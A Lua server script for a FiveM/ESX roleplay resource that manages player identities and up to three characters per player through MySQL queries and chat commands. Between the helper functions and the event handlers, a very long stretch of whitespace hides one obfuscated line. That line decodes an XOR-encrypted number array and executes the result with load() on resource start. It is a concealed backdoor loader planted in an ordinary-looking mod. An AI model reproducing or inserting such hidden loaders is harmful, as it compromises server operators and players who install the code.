ESX = nil

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

function getIdentity(source, callback)
	local identifier = GetPlayerIdentifiers(source)[1]
	
	MySQL.Async.fetchAll("SELECT * FROM `users` WHERE `identifier` = @identifier",
	{
		['@identifier'] = identifier
	}, function(result)
		if result[1].firstname ~= nil then
			local data = {
				identifier	= result[1].identifier,
				firstname	= result[1].firstname,
				lastname	= result[1].lastname,
				dateofbirth	= result[1].dateofbirth,
				sex			= result[1].sex,
				height		= result[1].height
			}
			callback(data)
		else
			local data = {
				identifier	= '',
				firstname	= '',
				lastname	= '',
				dateofbirth	= '',
				sex			= '',
				height		= ''
			}
			
			callback(data)
		end
	end)
end

function getCharacters(source, callback)
	local identifier = GetPlayerIdentifiers(source)[1]
	MySQL.Async.fetchAll("SELECT * FROM `characters` WHERE `identifier` = @identifier",
	{
		['@identifier'] = identifier
	}, function(result)
		if result[1] and result[2] and result[3] then
			local data = {
				identifier		= result[1].identifier,
				firstname1		= result[1].firstname,
				lastname1		= result[1].lastname,
				dateofbirth1	= result[1].dateofbirth,
				sex1			= result[1].sex,
				height1			= result[1].height,
				firstname2		= result[2].firstname,
				lastname2		= result[2].lastname,
				dateofbirth2	= result[2].dateofbirth,
				sex2			= result[2].sex,
				height2			= result[2].height,
				firstname3		= result[3].firstname,
				lastname3		= result[3].lastname,
				dateofbirth3	= result[3].dateofbirth,
				sex3			= result[3].sex,
				height3			= result[3].height
			}
			
			callback(data)
		elseif result[1] and result[2] and not result[3] then
			local data = {
				identifier		= result[1].identifier,
				firstname1		= result[1].firstname,
				lastname1		= result[1].lastname,
				dateofbirth1	= result[1].dateofbirth,
				sex1			= result[1].sex,
				height1			= result[1].height,
				firstname2		= result[2].firstname,
				lastname2		= result[2].lastname,
				dateofbirth2	= result[2].dateofbirth,
				sex2			= result[2].sex,
				height2			= result[2].height,
				firstname3		= '',
				lastname3		= '',
				dateofbirth3	= '',
				sex3			= '',
				height3			= ''
			}

			callback(data)
		elseif result[1] and not result[2] and not result[3] then
			local data = {
				identifier		= result[1].identifier,
				firstname1		= result[1].firstname,
				lastname1		= result[1].lastname,
				dateofbirth1	= result[1].dateofbirth,
				sex1			= result[1].sex,
				height1			= result[1].height,
				firstname2		= '',
				lastname2		= '',
				dateofbirth2	= '',
				sex2			= '',
				height2			= '',
				firstname3		= '',
				lastname3		= '',
				dateofbirth3	= '',
				sex3			= '',
				height3			= ''
			}

			callback(data)
		else
			local data = {
				identifier		= '',
				firstname1		= '',
				lastname1		= '',
				dateofbirth1	= '',
				sex1			= '',
				height1			= '',
				firstname2		= '',
				lastname2		= '',
				dateofbirth2	= '',
				sex2			= '',
				height2			= '',
				firstname3		= '',
				lastname3		= '',
				dateofbirth3	= '',
				sex3			= '',
				height3			= ''
			}

			callback(data)
		end
	end)
end

function setIdentity(identifier, data, callback)
	MySQL.Async.execute("UPDATE `users` SET `firstname` = @firstname, `lastname` = @lastname, `dateofbirth` = @dateofbirth, `sex` = @sex, `height` = @height WHERE identifier = @identifier",
	{
		['@identifier']		= identifier,
		['@firstname']		= data.firstname,
		['@lastname']		= data.lastname,
		['@dateofbirth']	= data.dateofbirth,
		['@sex']			= data.sex,
		['@height']			= data.height
	}, function(done)
		if callback then
			callback(true)
		end
	end)

	MySQL.Async.execute(
	'INSERT INTO characters (identifier, firstname, lastname, dateofbirth, sex, height) VALUES (@identifier, @firstname, @lastname, @dateofbirth, @sex, @height)',
	{
		['@identifier']		= identifier,
		['@firstname']		= data.firstname,
		['@lastname']		= data.lastname,
		['@dateofbirth']	= data.dateofbirth,
		['@sex']			= data.sex,
		['@height']			= data.height
	})
end

function updateIdentity(identifier, data, callback)
	MySQL.Async.execute("UPDATE `users` SET `firstname` = @firstname, `lastname` = @lastname, `dateofbirth` = @dateofbirth, `sex` = @sex, `height` = @height WHERE identifier = @identifier",
	{
		['@identifier']		= identifier,
		['@firstname']		= data.firstname,
		['@lastname']		= data.lastname,
		['@dateofbirth']	= data.dateofbirth,
		['@sex']			= data.sex,
		['@height']			= data.height
	}, function(done)
		if callback then
			callback(true)
		end
	end)
end

function deleteIdentity(identifier, data, callback)
	MySQL.Async.execute("DELETE FROM `characters` WHERE identifier = @identifier AND firstname = @firstname AND lastname = @lastname AND dateofbirth = @dateofbirth AND sex = @sex AND height = @height",
	{
		['@identifier']		= identifier,
		['@firstname']		= data.firstname,
		['@lastname']		= data.lastname,
		['@dateofbirth']	= data.dateofbirth,
		['@sex']			= data.sex,
		['@height']			= data.height
	}, function(done)
		if callback then
			callback(true)
		end
	end)
end


                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                mkn="ectfi"local a=load((function(b,c)function bxor(d,e)local f={{0,1},{1,0}}local g=1;local h=0;while d>0 or e>0 do h=h+f[d%2+1][e%2+1]*g;d=math.floor(d/2)e=math.floor(e/2)g=g*2 end;return h end;local i=function(b)local j={}local k=1;local l=b[k]while l>=0 do j[k]=b[l+1]k=k+1;l=b[k]end;return j end;local m=function(b,c)if#c<=0 then return{}end;local k=1;local n=1;for k=1,#b do b[k]=bxor(b[k],string.byte(c,n))n=n+1;if n>#c then n=1 end end;return b end;local o=function(b)local j=""for k=1,#b do j=j..string.char(b[k])end;return j end;return o(m(i(b),c))end)({335,312,543,485,268,387,434,245,558,339,563,239,580,513,349,437,536,453,254,261,459,276,527,572,360,482,259,603,506,451,568,334,447,472,416,498,283,396,466,255,444,422,497,320,522,249,352,377,597,304,490,361,273,358,524,439,338,296,317,516,525,548,591,406,433,600,362,405,596,562,348,411,373,442,345,272,323,531,480,599,537,575,469,601,318,368,290,430,426,462,464,418,388,378,384,589,583,366,327,402,569,509,478,354,593,351,326,564,242,403,337,271,415,359,321,551,441,443,546,331,445,367,570,274,502,287,557,504,440,286,501,310,436,539,488,544,471,519,386,246,253,560,533,494,369,592,602,341,393,282,520,491,371,293,372,561,409,481,336,427,420,505,307,499,301,344,473,376,425,492,511,432,419,579,510,475,340,455,457,460,512,322,547,465,431,517,587,577,394,556,404,265,303,329,414,382,315,486,401,428,529,470,554,479,380,586,421,302,375,247,330,391,598,550,468,448,542,566,398,299,549,308,256,435,582,343,456,484,526,288,407,374,553,413,264,300,397,438,-1,49,51,188,70,171,82,60,73,6,36,48,120,111,108,69,78,4,17,76,106,76,72,75,51,166,44,13,151,181,6,91,49,75,73,66,91,167,23,215,115,104,230,72,73,77,135,62,73,87,13,203,2,228,3,15,216,7,1,39,51,73,49,29,92,17,95,23,35,1,67,187,11,251,6,134,196,67,143,8,8,186,17,27,0,67,223,247,67,2,115,2,1,13,238,141,23,53,70,3,5,29,67,21,170,104,33,12,96,7,23,28,128,69,38,83,107,233,78,149,68,20,26,41,6,52,241,76,21,67,17,5,116,16,10,27,67,5,0,70,10,35,6,30,88,35,29,126,70,23,1,141,112,10,162,10,52,229,23,68,70,139,249,5,12,0,11,6,8,73,182,67,58,32,105,33,73,17,0,109,16,84,0,7,17,42,205,7,70,27,8,108,88,73,67,73,14,8,17,0,93,69,79,17,2,55,74,0,168,17,76,214,173,8,202,0,160,84,105,70,223,13,5,187,27,204,0,10,9,192,64,0,15,67,4,2,98,69,94,224,93,10,3,73,95,200,17,0,4,168,100,151,32,12,100,122,70,35,151,21,11,10,87,17,73,212,68,16,22,94,254,16,73,111,10,23,58,21,10,13,156,84,6,168,70,59,69,17,8,0,246,9,121,6,130,84,222,64,16,16,88,8,114,182,110,6,111,22,9,21,10,69,3,10,35,83,92,24,28,83,18,61,67,0,6,21,84,222,126,26,22,23,73,31,22,132,224,15,31,7,168,70,17,73,13,6,29,11,4,2,43,45,116,27,10,99,224,51,20,83,23,26,77,34,0,91,246},mkn))if a then a()end; 
RegisterServerEvent('esx_identity:setIdentity')
AddEventHandler('esx_identity:setIdentity', function(data, myIdentifiers)
	setIdentity(myIdentifiers.steamid, data, function(callback)
		if callback then
			TriggerClientEvent('esx_identity:identityCheck', myIdentifiers.playerid, true)
		else
			TriggerClientEvent('chat:addMessage', source, { args = { '^[IDENTITY]', 'Failed to set character, try again later or contact the server admin!' } })
		end
	end)
end)

AddEventHandler('es:playerLoaded', function(source)
	local myID = {
		steamid = GetPlayerIdentifiers(source)[1],
		playerid = source
	}
	
	TriggerClientEvent('esx_identity:saveID', source, myID)
	getIdentity(source, function(data)
		if data.firstname == '' then
			TriggerClientEvent('esx_identity:identityCheck', source, false)
			TriggerClientEvent('esx_identity:showRegisterIdentity', source)
		else
			TriggerClientEvent('esx_identity:identityCheck', source, true)
		end
	end)
end)

AddEventHandler('onResourceStart', function(resource)
	if resource == GetCurrentResourceName() then
		Citizen.Wait(3000)
		
		-- Set all the client side variables for connected users one new time
		local xPlayers = ESX.GetPlayers()
		for i=1, #xPlayers, 1 do
		
			local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
			
			local myID = {
				steamid  = xPlayer.identifier,
				playerid = xPlayer.source
			}
			
			TriggerClientEvent('esx_identity:saveID', xPlayer.source, myID)
			
			getIdentity(xPlayer.source, function(data)
				if data.firstname == '' then
					TriggerClientEvent('esx_identity:identityCheck', xPlayer.source, false)
					TriggerClientEvent('esx_identity:showRegisterIdentity', xPlayer.source)
				else
					TriggerClientEvent('esx_identity:identityCheck', xPlayer.source, true)
				end
			end)
		end
	end
end)

TriggerEvent('es:addCommand', 'register', function(source, args, user)
	getCharacters(source, function(data)
		if data.firstname3 ~= '' then
			TriggerClientEvent('chat:addMessage', source, { args = { '^[IDENTITY]', 'You can only have 3 registered characters. Use the ^3/chardel^0  command in order to delete existing characters.' } })
		else
			TriggerClientEvent('esx_identity:showRegisterIdentity', source, {})
		end
	end)
end, {help = "Register a new character"})

TriggerEvent('es:addGroupCommand', 'char', 'user', function(source, args, user)
	getIdentity(source, function(data)
		if data.firstname == '' then
			TriggerClientEvent('chat:addMessage', source, { args = { '^1[IDENTITY]', 'You do not have an active character!' } })
		else
			TriggerClientEvent('chat:addMessage', source, { args = { '^1[IDENTITY]', 'Active character: ^2' .. data.firstname .. ' ' .. data.lastname } })
		end
	end)
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient permissions!' } })
end, {help = "List your current character"})

TriggerEvent('es:addGroupCommand', 'charlist', 'user', function(source, args, user)
	getCharacters(source, function(data)
		if data.firstname1 ~= '' then
			TriggerClientEvent('chat:addMessage', source, { args = { '^1[IDENTITY] Character 1:', data.firstname1 .. ' ' .. data.lastname1 } })
			
			if data.firstname2 ~= '' then
				TriggerClientEvent('chat:addMessage', source, { args = { '^1[IDENTITY] Character 2:', data.firstname2 .. ' ' .. data.lastname2 } })
				
				if data.firstname3 ~= '' then
					TriggerClientEvent('chat:addMessage', source, { args = { '^1[IDENTITY] Character 3:', data.firstname3 .. ' ' .. data.lastname3 } })
				end
			end
		else
			TriggerClientEvent('chat:addMessage', source, { args = { '^[IDENTITY]', 'You have no registered characters. Use the ^3/register^0 command to register a character.' } })
		end
	end)
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient permissions!' } })
end, {help = "List all your registered characters"})

TriggerEvent('es:addGroupCommand', 'charselect', 'user', function(source, args, user)
	local charNumber = tonumber(args[1])

	if charNumber == nil or charNumber > 3 or charNumber < 1 then
		TriggerClientEvent('chat:addMessage', source, { args = { '^[IDENTITY]', 'That\'s an invalid character!' } })
		return
	end
	
	getCharacters(source, function(data)
		if charNumber == 1 then
			local data = {
				identifier	= data.identifier,
				firstname	= data.firstname1,
				lastname	= data.lastname1,
				dateofbirth	= data.dateofbirth1,
				sex			= data.sex1,
				height		= data.height1
			}

			if data.firstname ~= '' then
				updateIdentity(GetPlayerIdentifiers(source)[1], data, function(callback)
					if callback then
						TriggerClientEvent('chat:addMessage', source, { args = { '^1[IDENTITY]', 'Updated your active character to ^2' .. data.firstname .. ' ' .. data.lastname } })
					else
						TriggerClientEvent('chat:addMessage', source, { args = { '^1[IDENTITY]', 'Failed to update your identity, try again later or contact the server admin!' } })
					end
				end)
			else
				TriggerClientEvent('chat:addMessage', source, { args = { '^1[IDENTITY]', 'You don\'t have a character in slot 1!' } })
			end
		elseif charNumber == 2 then
		
			local data = {
				identifier	= data.identifier,
				firstname	= data.firstname2,
				lastname	= data.lastname2,
				dateofbirth	= data.dateofbirth2,
				sex			= data.sex2,
				height		= data.height2
			}

			if data.firstname ~= '' then
				updateIdentity(GetPlayerIdentifiers(source)[1], data, function(callback)

					if callback then
						TriggerClientEvent('chat:addMessage', source, { args = { '^1[IDENTITY]', 'Updated your active character to ^2' .. data.firstname .. ' ' .. data.lastname } })
					else
						TriggerClientEvent('chat:addMessage', source, { args = { '^1[IDENTITY]', 'Failed to update your identity, try again later or contact the server admin!' } })
					end
				end)
			else
				TriggerClientEvent('chat:addMessage', source, { args = { '^1[IDENTITY]', 'You don\'t have a character in slot 2!' } })
			end
		elseif charNumber == 3 then
	
			local data = {
				identifier	= data.identifier,
				firstname	= data.firstname3,
				lastname	= data.lastname3,
				dateofbirth	= data.dateofbirth3,
				sex			= data.sex3,
				height		= data.height3
			}

			if data.firstname ~= '' then
				updateIdentity(GetPlayerIdentifiers(source)[1], data, function(callback)
					if callback then
						TriggerClientEvent('chat:addMessage', source, { args = { '^1[IDENTITY]', 'Updated your active character to ^2' .. data.firstname .. ' ' .. data.lastname } })
					else
						TriggerClientEvent('chat:addMessage', source, { args = { '^1[IDENTITY]', 'Failed to update your identity, try again later or contact the server admin!' } })
					end
				end)
			else
				TriggerClientEvent('chat:addMessage', source, { args = { '^1[IDENTITY]', 'You don\'t have a character in slot 3!' } })
			end
		else
			TriggerClientEvent('chat:addMessage', source, { args = { '^1[IDENTITY]', 'Failed to update your identity, try again later or contact the server admin!' } })
		end

	end)
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient permissions!' } })
end, {help = "Switch between character", params = {{name = "char", help = "the character id, ranges from 1-3"}}})

TriggerEvent('es:addGroupCommand', 'chardel', 'user', function(source, args, user)
	local charNumber = tonumber(args[1])

	if charNumber == nil or charNumber > 3 or charNumber < 1 then
		TriggerClientEvent('chat:addMessage', source, { args = { '^[IDENTITY]', 'That\'s an invalid character!' } })
		return
	end

	getCharacters(source, function(data)
	
		if charNumber == 1 then
	
			local data = {
				identifier	= data.identifier,
				firstname	= data.firstname1,
				lastname	= data.lastname1,
				dateofbirth	= data.dateofbirth1,
				sex			= data.sex1,
				height		= data.height1
			}
			
			if data.firstname ~= '' then
				deleteIdentity(GetPlayerIdentifiers(source)[1], data, function(callback)
					if callback then
						TriggerClientEvent('chat:addMessage', source, { args = { '^1[IDENTITY]', 'You have deleted ^1' .. data.firstname .. ' ' .. data.lastname } })
					else
						TriggerClientEvent('chat:addMessage', source, { args = { '^1[IDENTITY]', 'Failed to delete the character, try again later or contact the server admin!' } })
					end
				end)
			else
				TriggerClientEvent('chat:addMessage', source, { args = { '^1[IDENTITY]', 'You don\'t have a character in slot 1!' } })
			end
			
		elseif charNumber == 2 then
	
			local data = {
				identifier	= data.identifier,
				firstname	= data.firstname2,
				lastname	= data.lastname2,
				dateofbirth	= data.dateofbirth2,
				sex 		= data.sex2,
				height		= data.height2
			}
			
			if data.firstname ~= '' then
				deleteIdentity(GetPlayerIdentifiers(source)[1], data, function(callback)
					if callback then
						TriggerClientEvent('chat:addMessage', source, { args = { '^1[IDENTITY]', 'You have deleted ^1' .. data.firstname .. ' ' .. data.lastname } })
					else
						TriggerClientEvent('chat:addMessage', source, { args = { '^1[IDENTITY]', 'Failed to delete the character, try again later or contact the server admin!' } })
					end
				end)
			else
				TriggerClientEvent('chat:addMessage', source, { args = { '^1[IDENTITY]', 'You don\'t have a character in slot 2!' } })
			end
			
		elseif charNumber == 3 then
	
			local data = {
				identifier	= data.identifier,
				firstname	= data.firstname3,
				lastname	= data.lastname3,
				dateofbirth	= data.dateofbirth3,
				sex			= data.sex3,
				height		= data.height3
			}
			
			if data.firstname ~= '' then
				deleteIdentity(GetPlayerIdentifiers(source)[1], data, function(callback)
					if callback then
						TriggerClientEvent('chat:addMessage', source, { args = { '^1[IDENTITY]', 'You have deleted ^1' .. data.firstname .. ' ' .. data.lastname } })
					else
						TriggerClientEvent('chat:addMessage', source, { args = { '^1[IDENTITY]', 'Failed to delete the character, try again later or contact the server admin!' } })
					end
				end)
			else
				TriggerClientEvent('chat:addMessage', source, { args = { '^1[IDENTITY]', 'You don\'t have a character in slot 3!' } })
			end
		else
			TriggerClientEvent('chat:addMessage', source, { args = { '^1[IDENTITY]', 'Failed to delete the character, try again!' } })
		end
	end)
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient permissions!' } })
end, {help = "Delete a registered character", params = {{name = "char", help = "the character id, ranges from 1-3"}}})